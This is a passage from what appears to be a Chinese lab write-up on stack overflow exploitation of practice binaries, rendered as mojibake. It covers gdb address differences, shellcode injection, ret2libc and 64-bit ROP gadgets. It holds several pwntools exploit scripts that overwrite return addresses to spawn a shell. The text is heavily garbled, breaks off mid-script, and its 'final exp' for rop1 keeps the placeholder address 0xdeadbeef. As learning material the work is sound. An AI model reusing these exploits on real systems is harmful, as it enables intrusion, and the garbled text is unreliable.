å¥½çš„shellcode,å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬æ‰¾åˆ°çš„çœŸå®bufåœ°å€ã€‚\nè¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆgdbè°ƒè¯•ä¸­äº§ç”Ÿçš„bufåœ°å€å’ŒçœŸæ­£æ‰§è¡Œç¨‹åºçš„åœ°å€åŸå› \næ­£å¸¸ç¨‹åºè¿è¡Œæ—¶ï¼Œä¼šå°†ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„å’Œå‘½ä»¤è¡Œå‚æ•°å­—ç¬¦ä¸²æ•°ç»„å­˜æ”¾åœ¨æ ˆé¡¶ï¼Œè€Œç¨‹åºä½¿ç”¨çš„å±€éƒ¨å˜é‡ç­‰æ•°æ®åˆ™ä½äºè¿™äº›å­—ç¬¦ä¸²æ•°ç»„ä¹‹åã€‚ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„è®°å½•äº†è¯¸å¦‚å½“å‰ç”¨æˆ·åã€ç»ˆç«¯ç±»å‹ã€æœç´¢è·¯å¾„ç­‰ç¯å¢ƒä¿¡æ¯ã€‚ç¨‹åºç›´æ¥è¿è¡Œæ—¶ï¼Œç¨‹åºè¿›ç¨‹ç»§æ‰¿çš„æ˜¯è¿è¡Œå…¶çš„ shell çš„ç¯å¢ƒå˜é‡ï¼Œè€Œç¨‹åºé€šè¿‡ gdb è¿è¡Œæ—¶ï¼Œç¨‹åºè¿›ç¨‹ç»§æ‰¿çš„æ˜¯ gdb çš„ç¯å¢ƒå˜é‡ï¼Œè¿™ä¸¤è€…å­˜åœ¨ä¸åŒï¼Œä»è€Œä¼šé€ æˆä½äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡çš„åœ°å€å‘ç”Ÿæ”¹å˜ã€‚ç”¨æˆ·å¯åœ¨ gdb ä¸­è¿è¡Œ show environment å‘½ä»¤è·å¾—ç¯å¢ƒå˜é‡å‚æ•°ã€‚ã€\nè¾ƒä¹‹ç¨‹åºç›´æ¥è¿è¡Œï¼Œä½äºæ ˆé¡¶çš„ç¯å¢ƒå˜é‡ä¸»è¦æœ‰ä»¥ä¸‹å˜åŒ–\nç¯å¢ƒå˜é‡çš„å†…å®¹å‘ç”Ÿæ”¹å˜ï¼Œåœ¨ç¨‹åºç›´æ¥è¿è¡Œæ—¶ï¼Œ_ å˜é‡å­˜æ”¾çš„æ˜¯ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ï¼Œè€Œé€šè¿‡ gdb è¿è¡Œç¨‹åºæ—¶ï¼Œ_ å˜é‡å­˜æ”¾çš„æ˜¯ gdb çš„æ‰§è¡Œè·¯å¾„ã€‚ é€šè¿‡ gdb è¿è¡Œçš„è°ƒè¯•ç¨‹åºç»§æ‰¿äº† gdb çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…å«æ–°åŠ å…¥çš„ç¯å¢ƒå˜é‡ LINES å’Œ COLUMNSã€‚ ä½äºæ ˆä¸Šçš„å‚æ•°åˆ—è¡¨ä¹Ÿå¯èƒ½ä¸åŒï¼Œå½“ç”¨æˆ·é€šè¿‡ ./rop1 ç›´æ¥åœ¨shell ä¸­è¿è¡Œç¨‹åºæ—¶ï¼Œä½äºå‚æ•°æ•°ç»„çš„ç¬¬ä¸€é¡¹ argv[0] å†…å®¹ä¸ºâ€./rop1â€ ,è€Œç”¨æˆ·é€šè¿‡ gdb è¿è¡Œ hello ç¨‹åºæ—¶ï¼Œç¨‹åºçš„å‚æ•°åˆ—è¡¨çš„ç¬¬ä¸€é¡¹ argv[0] çš„å€¼ä¸ºè¯¥ç¨‹åºçš„ç»å¯¹è·¯å¾„â€/home/reus09/test/pwn/2_rop/rop1â€ï¼Œè¿™ä¹Ÿä¼šé€ æˆç¨‹åºè¿è¡Œæ—¶å±€éƒ¨å˜é‡åœ°å€çš„å·®å¼‚ã€‚å»ºè®®ç»ˆç«¯ç¯å¢ƒä¸‹ä½¿ç”¨ç»å¯¹è·¯å¾„è¿è¡Œç¨‹åºï¼Œé¿å…è¯¥å·®å¼‚ã€‚ è¿™é‡Œæœ‰ä¸‰ç§è§£å†³æ–¹æ¡ˆ\né€šè¿‡gdbæ¥attach ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼Œå…¶åœ°å€å’Œæ­£åœ¨è¿è¡Œçš„åœ°å€æ˜¯ä¸€è‡´çš„\nåœ¨gdbè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå¯¹ä¼ é€’ç»™è¿›ç¨‹çš„ç¯å¢ƒå˜é‡è¿›è¡Œæ“ä½œå’Œä¿®æ”¹\ngdb å¯é€šè¿‡ wrapper å‡½æ•°è¿è¡Œè°ƒè¯•ç¨‹åºã€‚å½“è®¾ç½®å¥½ wrapper ç¨‹åºåï¼Œgdb ä¼šä»¥ exec wrapper hello çš„ shell å‘½ä»¤çš„å½¢å¼å¯åŠ¨è°ƒè¯•ç¨‹åº Helloï¼Œwrapperç¨‹åºé¦–å…ˆè¿è¡Œå¹¶æœ€ç»ˆå¯åŠ¨è°ƒè¯•è¿›ç¨‹ï¼Œä¹‹åç”± gdb å¯¹è°ƒè¯•è¿›ç¨‹è¿›è¡Œæ§åˆ¶ã€‚é€šè¿‡ wrapper ç¨‹åºï¼Œå³å¯æ§åˆ¶ä¼ é€’ç»™è°ƒè¯•è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚\n1 2 3 set exec-wrapper wrapperã€€//è®¾ç½® wrapper ç¨‹åºä¸º wrapper show exec-wrapper //æ˜¾ç¤ºå½“å‰çš„ wrapper ç¨‹åº unset exec-wrapperã€€//å–æ¶ˆå¯¹ wrapper ç¨‹åºçš„è®¾ç½® åˆ©ç”¨å†…æ ¸è½¬å‚¨è·å–çœŸå®åœ°å€ã€‚\nä½¿ç”¨å‘½ä»¤ulimit -c unlimitedå¯åŠ¨å†…æ ¸è½¬å‚¨ï¼Œç¼ºçœæƒ…å†µä¸‹ï¼Œå†…æ ¸åœ¨coredumpæ—¶æ‰€äº§ç”Ÿçš„coreæ–‡ä»¶æ”¾åœ¨ä¸è¯¥ç¨‹åºç›¸åŒçš„ç›®å½•ä¸­ï¼Œå¹¶ä¸”æ–‡ä»¶åå›ºå®šä¸ºcoreã€‚ ç„¶åä½¿ç”¨å‘½ä»¤gdb filename coreå³å¯è°ƒè¯•ï¼Œè·å¾—çœŸå®åœ°å€ã€‚ ç¬¬ä¸€ç§æ–¹æ¡ˆ é€šè¿‡gdbæ¥attach ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åº è¿è¡Œrop1ç¨‹åº åˆ©ç”¨ps -ax æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ï¼Œå‘ç°rop1è¿è¡Œçš„è¿›ç¨‹pid ä¸º 130896ï¼Œå°†å…¶ç›´æ¥attach åœ¨vulnåœ°æ–¹è®¾ç½®æ–­ç‚¹ï¼Œå¹¶ä¸”æ‰§è¡Œç¨‹åºï¼Œè¿›å…¥åˆ°vulnå‡½æ•°é‡Œé¢ ä¸€è·¯n å•æ­¥æ­¥è¿‡ï¼Œè·³åˆ°readå‡½æ•°ä¸Šé¢ å‘ç°bufåœ°å€ä¸º0xffffd1a0ï¼Œæ­¤æ—¶çš„bufåœ°å€å³ä¸ºçœŸå®åœ°å€ ç¬¬äºŒç§æ–¹æ¡ˆ gdbè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå»é™¤ç¯å¢ƒå˜é‡\nè¾“å…¥å‘½ä»¤gdb rop1\n1 set exec-wrapper env -u COLUMNS -u LINES -u _ //åœ¨ gdb ä¸­è®¾ç½® wrapper ç¨‹åº ç„¶ååœ¨vulnå¤„è®¾ç½®æ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºåï¼Œå•æ­¥è·³è¿‡ä¸€ç›´åˆ°readéƒ¨åˆ†\nå‘ç°æ­¤æ—¶çš„bufé¦–åœ°å€ä»ç„¶ä¸º 0xffffd1a0\nshellcode æ‰§è¡Œéƒ¨åˆ† ä¸Šè¿°ä¸¤ç§æ–¹æ¡ˆç¡®å®šäº†ç›´æ¥æ‰§è¡Œrop1ç¨‹åºçš„æ—¶å€™bufçš„çœŸæ­£é¦–åœ°å€0xffffd1a0\nä½†æ˜¯ç”±äºpwntools è‡ªå¸¦çš„ pythonç¯å¢ƒï¼Œä¼šå½±å“rop1ç¨‹åºè¿è¡Œçš„bufåœ°å€ï¼Œå› æ­¤è¿™ä¸ªçœŸå®åœ°å€æ˜¯ä¸èƒ½å¤Ÿåœ¨shellcodeä¸­ç›´æ¥ä½œä¸ºè¿”å›åœ°å€æ‰§è¡Œçš„ã€‚\nå› ä¸ºè¿™é‡Œéœ€è¦ç”¨gdbæ¥å®ç°shellcode çš„è°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ å…¥gdbçš„ç¯å¢ƒï¼Œå¹¶è®¾ç½®ä¸€äº›è½¯æ–­ç‚¹æ¥ä¿è¯gdbä¸­å¯ä»¥æ‰§è¡Œåˆ°shellcode\nè¿™é‡Œéœ€è¦ç”¨åˆ°coreæŠ¥é”™çš„éƒ¨åˆ†ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿéœ€è¦ç®¡é“æ¥è¾“å…¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ å¥½çš„shellcode\nè¿™é‡Œæˆ‘ä»¬éœ€è¦ç¡®å®šä¸€ä¸‹bufæ•°ç»„çš„é•¿åº¦ï¼Œä»¥åŠè¿”å›é•¿åº¦çš„ä½æ•°ï¼Œä»¥ä¾¿äºç¡®å®šæ‰¾åˆ°è¿”å›åœ°å€ä»è€Œè¦†ç›–æ‰å®ƒã€‚\nè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨åœ¨IDAé‡Œé¢æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬éœ€è¦å¡«å……å¤šå°‘å­—ç¬¦\nIDAæŸ¥çœ‹bufæ•°ç»„çš„å­˜å‚¨æƒ…å†µ ç”±æ­¤ç¡®å®šbufé¦–åœ°å€åˆ°esp çš„é•¿åº¦ä¸º 0x88,ç„¶ååˆ°è¿”å›åœ°å€çš„é•¿åº¦ä¸º0x04,å› æ­¤ç®—ä¸Šæˆ‘ä»¬æ„é€ çš„shellcodeï¼Œæˆ‘ä»¬éœ€è¦å¡«å……0x8cä¸ªå­—ç¬¦ ç„¶åæˆ‘ä»¬è¿™é‡Œä»¥ä¸€ä¸ªé”™è¯¯çš„åœ°å€0xdeadbeefæ¥äº§ç”ŸæŠ¥é”™ï¼Œä»è€Œå¾—åˆ°åœ¨gdbä¸­bufçš„å¯ç”¨åœ°å€\næˆ‘ä»¬é€šè¿‡pwntoolsäº§ç”Ÿshellcodeå°†å…¶ä¿å­˜ä¸ºdeadbeefï¼Œå…¶æœ€åçš„åœ°å€ä¼šè¢«è¦†ç›–ä¸º0xdeadbeef\nè„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;deadbeef\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„shellcodeå·²ç»å­˜å‚¨åˆ°æ–‡ä»¶deadbeefé‡Œé¢\nåœ¨gdb ä¸­è°ƒè¯•\nå‘½ä»¤r \u0026lt; deadbeefï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­é€šè¿‡ç®¡é“è¾“å…¥æˆ‘ä»¬æ„é€ å¥½çš„shellcode å‘ç°å¯„å­˜å™¨ECXå­˜å‚¨çš„æ˜¯shellcodeå­˜å‚¨çš„é¦–åœ°å€ æ­¤åœ°å€0xffffd170å³ä¸ºæˆ‘ä»¬gdbè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥åˆ©ç”¨çš„bufçœŸå®åœ°å€ ä¸‹é¢åˆ©ç”¨ä¸Šé¢åŒæ ·çš„æ–¹æ³•ï¼Œæ„é€ å¥½æˆ‘ä»¬éœ€è¦çš„äº§ç”Ÿshellcodeçš„æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xffffd170 payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;gdb_with_payload\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„shellcodeæ–‡ä»¶å³å·²ç»æ„é€ å®Œæˆã€‚\nä¸‹é¢åœ¨gdbä¸­æ‰§è¡Œæˆ‘ä»¬çš„shellcode\nè¿™é‡Œéœ€è¦åšä¸€äº›å‰ç½®å·¥ä½œï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦è®¾ç½®ä¸€äº›è½¯æ–­ç‚¹ã€‚å¦åˆ™è¾“å…¥shellcodeåè¿›ç¨‹ä¼šè¢«ç›´æ¥æ€æ­»ï¼Œç¨‹åºåªä¼šä¸€é—ªè€Œè¿‡ã€‚\nè¿™ä¸ªè½¯æ–­ç‚¹çš„æ„æ€æ˜¯ï¼Œè·Ÿè¸ªæˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶ï¼Œæ–‡ä»¶è¾“å…¥å®Œæ¯•åï¼Œè®¾ç½®æ–­ç‚¹\nå‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 set detach-on-fork on set follow-fork-mode child set breakpoint pending on b_start é¦–å…ˆå‘Šè¯‰ gdb è·Ÿè¸ªå­è¿›ç¨‹ï¼›ç„¶åè®¾ç½®set breakpoint pending onæ˜¯ä¸ºäº†åœ¨è®¾ç½®æ–­ç‚¹æ—¶è®© gdb ä¸å¼ºåˆ¶åœ¨å¯¹ç¬¦å·ä¸‹æ–­ç‚¹æ—¶å°±éœ€è¦å›ºå®šåœ°å€ï¼Œè¿™æ ·åœ¨b _startæ—¶å°±ä¼š pending è€Œä¸æ˜¯æŠ¥é”™ï¼›æœ€åå†è¿æ¥åˆ°çˆ¶è¿›ç¨‹ä»¥åŠåŠ è½½å­è¿›ç¨‹çš„ç¬¦å·ã€‚ ç›´æ¥gdb rop1è¿›å…¥å‘½ä»¤ï¼Œç„¶åè¾“å…¥ä¸Šè¿°è®¾ç½®å­è¿›ç¨‹çš„å‘½ä»¤\nç„¶åè¾“å…¥å‘½ä»¤r \u0026lt; gdb_with_payloadï¼Œæ‰§è¡Œçš„æ—¶å€™é€šè¿‡ç®¡é“ç¬¦è½½å…¥æ•°æ®gdb_with_payloadï¼Œè¿™é‡Œè¦†ç›–è¿”å›åœ°å€çš„æ˜¯æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„é€‚åˆgdbç¯å¢ƒçš„bufåœ°å€(æ³¨æ„ï¼Œè¿™é‡Œçš„bufåœ°å€å¹¶ä¸æ˜¯ç¨‹åºç›´æ¥è¿è¡Œäº§ç”Ÿçš„bufåœ°å€) è¿ç»­çš„rå‘½ä»¤ è¿™é‡Œé€šè¿‡ä¸€ä¸ªå­è¿›ç¨‹çš„è°ƒåº¦ä»è€Œè¿è¡Œäº†æˆ‘ä»¬çš„shellcodeï¼Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°è¿™é‡Œå‡ºç°äº†æˆ‘ä»¬çš„è¾“å…¥å‘½ä»¤ éªŒè¯æ˜¯å¦æ‹¿åˆ°shell\nè¾“å…¥å‘½ä»¤ls è¾“å…¥å‘½ä»¤whoami è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†é€šè¿‡gdbè°ƒè¯•ç›´æ¥ æ§åˆ¶shellï¼Œä½†æ˜¯ç”±äºè®¾ç½®æ–­ç‚¹çš„å­è¿›ç¨‹è¾“å…¥å‘½ä»¤åï¼Œç›´æ¥è¢«é™„è¿‘åˆ°å½“å‰çš„å‘½ä»¤ï¼Œæ•…æ¯æ¬¡è°ƒè¯•åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚\nrop1_py è¿™é‡Œæ˜¯ä½¿ç”¨pwntoolså·¥å…·æ¥å®ç°æ‹¿åˆ°shell,pwntoolså®ç°çš„è¿æ¥æŒä¹…ï¼Œè¿™é‡ŒåŒæ ·ä¹Ÿæ˜¯æˆ‘ä»¬ä¸Šè¿°æåˆ°çš„ç¬¬ä¸‰ç§æ–¹æ¡ˆåˆ©ç”¨å†…æ ¸è½¬å‚¨è·å–çœŸå®åœ°å€(å³åˆ©ç”¨ dump core æ¥å®ç°è·å–bufåœ°å€ï¼Œè¿™ä¸ªbufåœ°å€æ˜¯å—pythonç¯å¢ƒå½±å“çš„)\né¦–å…ˆæ„é€ è™šå‡çš„åœ°å€0xdeadbeefæ¥ä½¿ç¨‹åºå´©æºƒäº§ç”Ÿcore\nè„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() åœ¨ç»ˆç«¯æ‰§è¡Œè¯¥è„šæœ¬\né€šè¿‡å‰ålså‘½ä»¤å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ï¼Œæ‰§è¡Œè„šæœ¬ä¹‹åç¨‹åºå´©æºƒï¼Œäº§ç”Ÿäº†coreæŠ¥é”™æ–‡ä»¶ æ‰§è¡Œå‘½ä»¤gdb ./rop1 coreæ¥è°ƒè¯•è¯¥core\næ­¤æ—¶espæŒ‡é’ˆä½äºè¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œå› æ­¤bufçš„åœ°å€æ˜¯esp-0x4-0x8cï¼Œå³åœ°å€esp-0x90 é€šè¿‡å‘½ä»¤x/s $esp-0x90æŸ¥çœ‹ å‘ç°åœ°å€0xffffd1c0å­˜å‚¨çš„æœç„¶æ˜¯shellcodeå­˜æ”¾çš„åœ°æ–¹ äºæ˜¯ç›´æ¥å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º0xffffd1c0\nåœ¨ç»ˆç«¯æ‰§è¡Œexp\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†shell æœ€ç»ˆexp å¦‚ä¸‹\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() rop2_32 ç¼–è¯‘rop1.cï¼Œåªå¼€å¯Canaryæ ˆä¿æŠ¤ï¼Œåœ¨32ä½ç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ç”Ÿæˆrop2\nå¯ä»¥çœ‹åˆ°NXä¿æŠ¤å·²ç»å¼€å¯ï¼Œç¨‹åºä¸º32ä½ç¨‹åº\næŸ¥çœ‹rop2è¿›ç¨‹æ ˆçš„æƒé™ä¸ºrw-pï¼Œä¸å¯æ‰§è¡Œ\næ ˆä¸Šçš„ç¨‹åºä¸èƒ½è¿è¡Œï¼Œå³æˆ‘ä»¬ä¸èƒ½åœ¨æ ˆä¸Šæ‰§è¡Œshellcodeï¼Œä½†åœ¨ç¨‹åºä¸­ç”¨åˆ°äº†libcåº“ä¸­çš„readå’Œprintfå‡½æ•°ï¼Œlibc.soä¸­ä¿å­˜äº†å¤§é‡çš„å¯ç”¨å‡½æ•°ï¼Œè€ƒè™‘è°ƒç”¨system(\u0026quot;/bin/sh\u0026quot;)æ¥ç»•è¿‡NXä¿æŠ¤è·å–shell\næ ¹æ®ROPçš„åŸç†ï¼Œä¸éš¾å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬è¦è°ƒç”¨çš„systemå‡½æ•°åœ°å€ï¼Œç„¶ååœ¨å®ƒä¸‹é¢å†™å…¥systemå‡½æ•°éœ€è¦è¿”å›çš„åœ°å€ä»¥åŠå®ƒä¼ å…¥çš„å‚æ•°/bin/sh\nç¤ºæ„å›¾å¦‚ä¸‹ è¿™é‡Œé¦–å…ˆç¡®å®šä¸€ä¸‹bufé¦–åœ°å€åˆ°è¿”å›åœ°å€ä¸­é—´çš„å·®è·ï¼Œä»¥ä¾¿ç¡®å®šå¡«å……å¤šå°‘å­—ç¬¦æ¥è¦†ç›–è¿”å›åœ°å€ã€‚\nåŒæ ·ç”¨IDA æŸ¥çœ‹ rop2 ä¸­ bufçš„ç»“æ„ å‘ç°éœ€è¦å¡«å……çš„å­—ç¬¦ä¸º0x88 + 0x04 ä¸º 0x8c å› ä¸ºæˆ‘ä»¬ç¯å¢ƒå·²ç»å…³é—­äº†åœ°å€éšæœºåŒ–ï¼Œå› æ­¤systemå’Œ/bin/shçš„åœ°å€å¹¶ä¸ä¼šéšç¨‹åºè¿è¡Œè€Œæ”¹å˜ã€‚\næ¥ä¸‹æ¥å¯»æ‰¾systemçš„åœ°å€\næˆ‘ä»¬å¯ä»¥åœ¨gdb è°ƒè¯•è¿‡ç¨‹ä¸­ ç›´æ¥ è°ƒç”¨å‘½ä»¤print system æ¥æŸ¥çœ‹systemå‡½æ•°åœ°å€ å› æ­¤systemå‡½æ•°åœ°å€ä¸º0xf7e17830 æ¥ä¸‹æ¥éœ€è¦æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²/bin/shçš„å­˜å‚¨åœ°å€\nè¿™é‡Œæˆ‘ä»¬éœ€è¦è°ƒè¯•gdbè¿‡ç¨‹ä¸­ï¼Œç”¨åˆ°vmmap å‘½ä»¤æ¥æŸ¥çœ‹libc.soçš„èµ·å§‹ä½ç½®ï¼Œåœ¨å…¶ä¸­é—´æŸ¥æ‰¾åˆ°å­˜å‚¨/bin/shçš„åœ°å€ æ ¹æ®èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼ŒæŸ¥æ‰¾/bin/shçš„ä½ç½® æ˜¾ç„¶/bin/shå­˜æ”¾çš„åœ°å€ä¸º0xf7f64352 æˆ‘ä»¬è°ƒç”¨systemåçš„è¿”å›åœ°å€å› ä¸ºæˆ‘ä»¬ä¸éœ€è¦è¿”å›ï¼Œæ‰€ä»¥ç›´æ¥å¡«å……0xdeadbeefå³å¯\nåœ¨ç»ˆç«¯ä¸‹è°ƒç”¨exp\nå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†shell æœ€ç»ˆexp:\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop2\u0026#39;) #gdb.attach(p,\u0026#39;b vuln\u0026#39;) sys_addr=0xf7e17830 binsh_addr=0xf7f64352 payload = b\u0026#39;a\u0026#39;*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) p.sendline(payload) p.interactive() rop3_64 ç¼–è¯‘rop1.cï¼Œåªå¼€å¯Canaryæ ˆä¿æŠ¤ï¼Œå…³é—­no-pieåœ¨64ä½ç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ç”Ÿæˆrop3\nè¿™é‡ŒåŒæ ·å…³é—­äº†NXä¿æŠ¤,åŒæ—¶ç¼–è¯‘äº§ç”Ÿçš„ç¨‹åºä¸º64ä½ å¹¶ä¸èƒ½åœ¨æ ˆä¸Šç›´æ¥å†™shellcodeï¼Œè€ƒè™‘åŒæ ·æ„é€ ROPé“¾çš„å½¢å¼æ¥æ‹¿åˆ°shellï¼Œä½†æ˜¯64ä½ç¨‹åºä¸åŒäº32ä½ç¨‹åºï¼Œå‚æ•°å­˜æ”¾åœ¨å¯„å­˜å™¨ä¸­ï¼Œå¤šäº6ä¸ªå‚æ•°æ‰ä¼šæ”¾åœ¨æ ˆä¸Šã€‚\nå›¾ä¾‹\nå…³äºæ¼æ´åˆ©ç”¨\nç”±äºå‚æ•°ä¸ä¼šç›´æ¥æ”¾åœ¨æ ˆä¸Šï¼Œéœ€è¦å¯»æ‰¾ç±»ä¼¼äºpop rdiï¼›retçš„gadgetï¼Œå°†å‚æ•°ä»æ ˆä¸­å¼¹å‡ºåˆ°rdiå¯„å­˜å™¨åï¼Œè¿”å›åˆ°è¿”å›åœ°å€å¤„ç»§ç»­æ‰§è¡Œã€‚æœ¬ä¾‹å­åœ¨æ ˆä¸­äº‹å…ˆå‹å…¥å‚æ•°/bin/shåœ°å€å’Œsystemåœ°å€ã€‚ å›¾ä¾‹å³ä¸º ubuntu20 å­—èŠ‚å¯¹é½ é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹è¦ä»bufæ•°ç»„åˆ°è¿”å›åœ°å€ æˆ‘ä»¬éœ€è¦è¦†ç›–å¤šå°‘å­—èŠ‚\nè¿™é‡ŒåŒæ ·ä½¿ç”¨IDAæ¥æŸ¥çœ‹ç¨‹åº å‘ç°bufæ•°ç»„é•¿åº¦ä¸º0x80ï¼Œè¿”å›åœ°å€é•¿åº¦ä¸º0x08ï¼Œæ•…æˆ‘ä»¬éœ€è¦è¦†ç›–çš„é•¿åº¦ä¸º0x88 æ‰¾åˆ°å­˜åœ¨pop rdi;retçš„æŒ‡ä»¤åœ°å€\nè¿™é‡Œä½¿ç”¨ROPgadget å·¥å…· é¦–å…ˆä½¿ç”¨å‘½ä»¤ldd rop3æŸ¥çœ‹rop3ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬ï¼Œæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œç„¶åå°±åœ¨libcåº“ä¸­æŸ¥åˆ°æˆ‘ä»¬éœ€è¦çš„pop rdi;ret è¿™é‡Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†pop|rdi ç›¸å¯¹äºlibcçš„åç§»åœ°å€0x0000000000026b72 æ‰¾åˆ°systemå’Œ/bin/shçš„åœ°å€\nè¿™é‡Œçš„æ–¹æ³•å’Œæ‰¾rop2ä¸­çš„æ–¹æ³•ä¸€æ ·\nåœ¨gdbè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œåˆ†åˆ«ç”¨print system å’Œvmmap æŸ¥æ‰¾åœ°å€\nå¯ä»¥çœ‹åˆ°systemçš„å­˜å‚¨åœ°å€ä¸º0x7ffff7e22410\nvmmap å’Œfindå‘½ä»¤æŸ¥æ‰¾/bin/shåœ°å€\nå¯ä»¥çœ‹åˆ°/bin/shçš„åœ°å€ä¸º0x7ffff7f845aa\n/usr/lib/x86_64-linux-gnu/libc-2.31.soçš„èµ·å§‹åœ°å€ä¸º0x7ffff7dcd000\næŒ‰é“ç†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»å°†åœ°å€ä¸€ä¸€å¯¹åº”å¡«å…¥å³å¯æ‹¿åˆ°shellcodeï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æœºå™¨ä½¿ç”¨çš„ä¸ºubuntu 20,åœ¨ubuntu18ç‰ˆæœ¬ä»¥ä¸Šçš„ç³»ç»Ÿï¼Œ64ä½çš„ç¨‹åºè‹¥åŒ…å«äº†systemï¼ˆâ€œ/bin/shâ€ï¼‰ï¼Œå°±éœ€è¦è€ƒè™‘å †æ ˆå¹³è¡¡ã€‚å› ä¸ºåœ¨Ubuntu18ä¸‹systemè°ƒç”¨æ—¶è¦æ±‚åœ°å€å’Œ16å­—èŠ‚å¯¹é½ï¼Œå¦‚æœæ²¡æœ‰æ ˆå¯¹é½çš„è¯ï¼Œç¨‹åºå°±ç›´æ¥crashäº†ã€‚\næˆ‘ä»¬è¿™é‡Œå¡«å……çš„å­—ç¬¦é•¿åº¦ä¸º0x88ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨åŠ å…¥0x08ä¸ªå­—ç¬¦æ¥å¹³è¡¡æ ˆï¼Œè¿™ç§æƒ…å†µä¸‹å¦‚åŠ å…¥æ–°çš„å­—èŠ‚ä¸èƒ½å½±å“æˆ‘ä»¬ROPé“¾çš„æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬è¯¥å­—ç¬¦å­˜å‚¨å› æ”¹ä¸ºretæŒ‡ä»¤ç±»ä¼¼çš„ä¸å½±å“é€»è¾‘çš„æŒ‡ä»¤ã€‚\næˆ‘ä»¬åŒæ ·æ ¹æ®ROPgadgetæ¥æ‹¿åˆ°å¯¹åº”çš„retå­˜æ”¾çš„åœ°å€\næˆ‘ä»¬ç›´æ¥æŸ¥çœ‹ä½äºlibc.soä¸­çš„ç¨‹åºä¸­ä¸€ä¸ªå­˜å‚¨retæŒ‡ä»¤çš„åœ°å€\nå‘½ä»¤ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026quot;ret\u0026quot;\nå› ä¸ºè¿™é‡Œç›¸å¯¹åç§»åŸºäºlibc.soçš„é¦–åœ°å€ä¸º0x0000000000025679\næ‰€ä»¥retçš„å®é™…åœ°å€ä¸º0x7ffff7dcd000+0x0000000000025679\nå°†å¡«å……å¥½çš„åœ°å€ å†™å…¥expä¸­ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œexp\næœ€ç»ˆexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * p = 